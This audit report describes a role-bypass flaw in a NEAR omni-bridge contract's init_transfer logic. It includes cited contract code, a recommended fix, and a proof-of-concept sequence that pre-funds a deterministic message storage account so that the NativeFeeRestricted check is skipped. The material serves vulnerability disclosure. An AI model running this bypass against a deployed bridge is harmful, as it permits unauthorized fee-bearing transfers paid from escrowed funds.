Audit Report

## Title
`NativeFeeRestricted` Role Bypass via Pre-Deposit to Deterministic Message Storage Account — (`near/omni-bridge/src/lib.rs`)

## Summary

The `NativeFeeRestricted` role check in `init_transfer` is placed exclusively in the second branch of a short-circuit `||` condition. An account holding the `NativeFeeRestricted` role can force the first branch to succeed by pre-depositing NEAR to the deterministically computable message storage account ID, causing the role check to be skipped entirely and allowing a transfer with a non-zero `native_token_fee` to proceed.

## Finding Description

In `init_transfer`, the storage-payer selection logic is a short-circuit OR:

```rust
if self
    .try_to_transfer_balance_from_message_account(   // Branch 1 — no role check
        &message_storage_account_id,
        NearToken::from_yoctonear(init_transfer_msg.native_token_fee.0),
        &signer_id,
        required_storage_balance,
    )
    .is_ok()
    || (self.has_storage_balance(...)                 // Branch 2 — role check here
        && (init_transfer_msg.native_token_fee.0 == 0
            || !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone())))
{
``` [1](#0-0) 

The `NativeFeeRestricted` guard lives exclusively in Branch 2. If Branch 1 returns `Ok(())`, the right-hand side of the `||` is never evaluated due to short-circuit semantics.

`try_to_transfer_balance_from_message_account` contains no role check and returns `Ok` when: (a) `message_storage_account_id` is registered in `accounts_balances` with `total >= native_fee`, (b) `signer_id` is registered in `accounts_balances`, and (c) combined available balance covers `required_storage_payer_balance + native_fee`. [2](#0-1) 

The `message_storage_account_id` is computed from `TransferMessageStorageAccount { token, amount, recipient, fee, sender, msg }` — nonces (`origin_nonce`, `destination_nonce`) are explicitly excluded from the struct and therefore from the hash, making the account ID fully predictable before the transfer is submitted. [3](#0-2) [4](#0-3) 

`storage_deposit` accepts any `account_id` with no caller restrictions — anyone can register and fund any account ID in `accounts_balances`. [5](#0-4) 

The same gap exists in `init_transfer_resume`, which also calls `try_to_transfer_balance_from_message_account` without any role check. A `NativeFeeRestricted` account that deposits to the message account after yielding would also bypass the check there. [6](#0-5) 

The existing test suite in `near/omni-tests/src/native_fee_role.rs` only exercises Branch 2 (the signer's own storage balance path) and does not cover the Branch 1 bypass scenario. [7](#0-6) 

## Impact Explanation

An account granted `NativeFeeRestricted` can initiate transfers with an arbitrary non-zero `native_token_fee`, completely bypassing the intended access control restriction. This is a role bypass under the Critical impact category: "Unauthorized transaction, authorization bypass, role bypass… that lets an attacker execute bridge… actions." The `native_token_fee` is paid out to relayers from the bridge's escrowed NEAR, so bypassing the restriction constitutes unauthorized fee accounting manipulation and unauthorized bridge action execution.

## Likelihood Explanation

The exploit requires only two public contract calls (`storage_deposit` twice) and offline computation of a SHA-256 hash. No privileged access beyond holding the `NativeFeeRestricted` role itself is needed. The message account ID is deterministic and computable by any party with knowledge of the planned transfer parameters. Any account that has been assigned the restricted role and is motivated to circumvent it can execute this bypass repeatably.

## Recommendation

Move the `NativeFeeRestricted` check to a position that is evaluated unconditionally whenever `native_token_fee > 0`, regardless of which storage-payment branch is taken. Add an early guard at the top of `init_transfer` before the branch logic:

```rust
require!(
    init_transfer_msg.native_token_fee.0 == 0
        || !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone()),
    BridgeError::NativeFeeRestricted.as_ref()
);
```

Apply the same fix to `init_transfer_resume` to guard against the yield-path bypass.

## Proof of Concept

```rust
// 1. Admin grants NativeFeeRestricted to attacker
locker.call("acl_grant_role")
    .args_json(json!({ "role": "NativeFeeRestricted", "account_id": attacker_id }))
    .transact();

// 2. Attacker computes the message storage account ID offline (no nonces involved)
let storage_account = TransferMessageStorageAccount {
    token: OmniAddress::Near(token_id.clone()),
    amount: U128(transfer_amount),
    recipient: eth_recipient.clone(),
    fee: Fee { fee: U128(token_fee), native_fee: U128(native_fee_amount) },
    sender: OmniAddress::Near(attacker_id.clone()),
    msg: String::new(),
};
let message_account_id = storage_account.id(None); // deterministic

// 3. Attacker pre-deposits to the message storage account
attacker.call(locker, "storage_deposit")
    .args_json(json!({ "account_id": message_account_id }))
    .deposit(min_account_storage + native_fee_amount + required_transfer_storage)
    .transact();

// 4. Attacker registers themselves (required by try_to_transfer_balance_from_message_account)
attacker.call(locker, "storage_deposit")
    .args_json(json!({ "account_id": attacker_id }))
    .deposit(min_account_storage)
    .transact();

// 5. Attacker initiates transfer with non-zero native_token_fee
attacker.call(token, "ft_transfer_call")
    .args_json(json!({
        "receiver_id": locker,
        "amount": U128(transfer_amount),
        "msg": serde_json::to_string(&InitTransferMsg {
            native_token_fee: U128(native_fee_amount), // non-zero, should be blocked
            fee: U128(token_fee),
            recipient: eth_recipient,
            msg: None,
            external_id: None,
        })?,
    }))
    .deposit(NearToken::from_yoctonear(1))
    .transact();

// Result: try_to_transfer_balance_from_message_account returns Ok(()),
// NativeFeeRestricted check at line 579-580 is never reached,
// InitTransferEvent is emitted with fee.native_fee == native_fee_amount.
```

This can be demonstrated as a sandbox integration test extending the existing `native_fee_role.rs` test suite by adding a step that pre-deposits to the computed `message_account_id` before calling `ft_transfer_call` with a non-zero `native_token_fee` while the sender holds the `NativeFeeRestricted` role, then asserting the `InitTransferEvent` is emitted with the non-zero fee.

### Citations

**File:** near/omni-bridge/src/lib.rs (L566-581)
```rust
        if self
            .try_to_transfer_balance_from_message_account(
                &message_storage_account_id,
                NearToken::from_yoctonear(init_transfer_msg.native_token_fee.0),
                &signer_id,
                required_storage_balance,
            )
            .is_ok()
            || (self.has_storage_balance(
                &signer_id,
                required_storage_balance.saturating_add(NearToken::from_yoctonear(
                    init_transfer_msg.native_token_fee.0,
                )),
            ) && (init_transfer_msg.native_token_fee.0 == 0
                || !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone())))
        {
```

**File:** near/omni-bridge/src/lib.rs (L635-645)
```rust
        if let Err(err) = self.try_to_transfer_balance_from_message_account(
            &message_storage_account_id,
            NearToken::from_yoctonear(transfer_message.fee.native_fee.0),
            &storage_owner,
            self.required_balance_for_init_transfer_message(transfer_message.clone()),
        ) {
            env::log_str(&format!("Error paying native fee and storage: {err}"));
            return transfer_message.amount;
        }

        self.init_transfer_internal(transfer_message, storage_owner)
```

**File:** near/omni-bridge/src/storage.rs (L140-169)
```rust
    #[payable]
    pub fn storage_deposit(&mut self, account_id: Option<AccountId>) -> StorageBalance {
        let account_id = account_id.unwrap_or_else(env::predecessor_account_id);
        let amount = env::attached_deposit();
        let storage = self.accounts_balances.get(&account_id).map_or_else(
            || {
                let min_required_storage_balance = self.required_balance_for_account();
                let available = amount
                    .checked_sub(min_required_storage_balance)
                    .near_expect(StorageError::NotEnoughStorageBalanceAttached {
                        required: min_required_storage_balance,
                        attached: amount,
                    });
                StorageBalance {
                    total: amount,
                    available,
                }
            },
            |mut storage| {
                storage.total = storage.total.saturating_add(amount);
                storage.available = storage.available.saturating_add(amount);
                storage
            },
        );
        self.accounts_balances.insert(&account_id, &storage);

        self.resume_promise(&account_id).detach();

        storage
    }
```

**File:** near/omni-bridge/src/storage.rs (L260-290)
```rust
    pub(crate) fn try_to_transfer_balance_from_message_account(
        &mut self,
        account_id: &AccountId,
        native_fee: NearToken,
        storage_payer: &AccountId,
        required_storage_payer_balance: NearToken,
    ) -> Result<(), StorageError> {
        let balance = self
            .accounts_balances
            .get(account_id)
            .ok_or(StorageError::MessageAccountNotRegistered)?;

        if balance.total < native_fee {
            return Err(StorageError::NotEnoughBalanceForFee);
        }

        let mut storage = self
            .accounts_balances
            .get(storage_payer)
            .ok_or(StorageError::SignerNotRegistered)?;

        storage.available = storage.available.saturating_add(balance.total);

        if storage.available < required_storage_payer_balance.saturating_add(native_fee) {
            return Err(StorageError::SignerNotEnoughBalance);
        }

        self.accounts_balances.insert(storage_payer, &storage);
        self.accounts_balances.remove(account_id);
        Ok(())
    }
```

**File:** near/omni-types/src/lib.rs (L599-621)
```rust
#[near(serializers=[borsh])]
#[derive(Debug, Clone)]
pub struct TransferMessageStorageAccount {
    pub token: OmniAddress,
    pub amount: U128,
    pub recipient: OmniAddress,
    pub fee: Fee,
    pub sender: OmniAddress,
    pub msg: String,
}

impl TransferMessageStorageAccount {
    #[allow(clippy::missing_panics_doc)]
    pub fn id(&self, external_id: Option<String>) -> AccountId {
        let mut bytes = borsh::to_vec(self).unwrap();
        if let Some(external_id) = external_id {
            bytes.extend_from_slice(external_id.as_bytes());
        }
        let hash = utils::sha256(&bytes);
        let implicit_account_id = hex::encode(hash);
        AccountId::try_from(implicit_account_id).unwrap()
    }
}
```

**File:** near/omni-types/src/lib.rs (L623-633)
```rust
impl From<TransferMessage> for TransferMessageStorageAccount {
    fn from(value: TransferMessage) -> Self {
        Self {
            token: value.token,
            amount: value.amount,
            recipient: value.recipient,
            fee: value.fee,
            sender: value.sender,
            msg: value.msg,
        }
    }
```

**File:** near/omni-tests/src/native_fee_role.rs (L191-280)
```rust
        async fn initialize_transfer(
            &self,
            amount: u128,
            native_fee: u128,
            token_fee: u128,
            should_succeed: bool,
        ) -> anyhow::Result<Option<TransferMessage>> {
            // Prepare storage deposit for the sender
            let required_balance_account: NearToken = self
                .locker_contract
                .view("required_balance_for_account")
                .await?
                .json()?;

            let init_transfer_msg = InitTransferMsg {
                native_token_fee: U128(native_fee),
                fee: U128(token_fee),
                recipient: eth_eoa_address(),
                msg: None,
                external_id: None,
            };

            let required_balance_init_transfer: NearToken = self
                .locker_contract
                .view("required_balance_for_init_transfer")
                .args_json(json!({
                    "recipient": init_transfer_msg.recipient,
                    "sender": OmniAddress::Near(self.sender_account.id().clone()),
                }))
                .await?
                .json()?;

            // Deposit to storage
            let storage_deposit_amount = required_balance_account
                .saturating_add(NearToken::from_yoctonear(native_fee))
                .saturating_add(required_balance_init_transfer);

            self.sender_account
                .call(self.locker_contract.id(), "storage_deposit")
                .args_json(json!({
                    "account_id": self.sender_account.id(),
                }))
                .deposit(storage_deposit_amount)
                .max_gas()
                .transact()
                .await?
                .into_result()?;

            // Initiate the transfer
            let transfer_result = self
                .sender_account
                .call(self.token_contract.id(), "ft_transfer_call")
                .args_json(json!({
                    "receiver_id": self.locker_contract.id(),
                    "amount": U128(amount),
                    "memo": None::<String>,
                    "msg": serde_json::to_string(&init_transfer_msg)?,
                }))
                .deposit(NearToken::from_yoctonear(1))
                .max_gas()
                .transact()
                .await?;

            // For the case where we expect failure
            if !should_succeed {
                assert_eq!(U128(0), transfer_result.clone().json().unwrap());
                return Ok(None);
            }
            assert_eq!(U128(amount), transfer_result.clone().json().unwrap());

            // For successful case, extract the transfer message
            let logs = transfer_result
                .logs()
                .iter()
                .map(|s| (*s).to_string())
                .collect::<Vec<String>>();

            let log_refs = logs.iter().collect::<Vec<&String>>();

            let omni_bridge_event: OmniBridgeEvent = serde_json::from_value(
                get_event_data("InitTransferEvent", &log_refs)?
                    .ok_or_else(|| anyhow::anyhow!("InitTransferEvent not found"))?,
            )?;

            let OmniBridgeEvent::InitTransferEvent { transfer_message } = omni_bridge_event else {
                anyhow::bail!("InitTransferEvent is found in unexpected event")
            };

            Ok(Some(transfer_message))
        }
```
